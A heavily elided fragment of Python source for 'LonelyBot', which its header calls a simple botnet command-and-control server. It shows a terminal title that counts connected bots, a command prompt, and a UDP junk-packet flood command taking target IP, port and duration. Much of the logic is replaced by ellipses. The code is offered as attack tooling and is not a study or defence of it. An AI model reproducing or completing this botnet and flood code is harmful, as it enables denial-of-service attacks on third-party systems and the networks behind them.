# LonelyBot - A simple Python botnet
# Author: WodX
# Date: 27/09/2019
# CnC server
...
def update_title(client, username):
    ...
    while 1:
        try:
            send(client, f'\33]0;LonelyBot | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()
...
def command_line(client):
    ...
    prompt = f'{Fore.LIGHTBLUE_EX}LonelyBot {Fore.LIGHTWHITE_EX}$ '
        ...
        try:
            ...
            # UDP junk data packets flood
                ...
                if len(args) == 5:
                    ...
                    send(client, 'Usage: .ovh [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
...
def handle_client(client, address):
    send(client, f'\33]0;LonelyBot | Login\a', False)
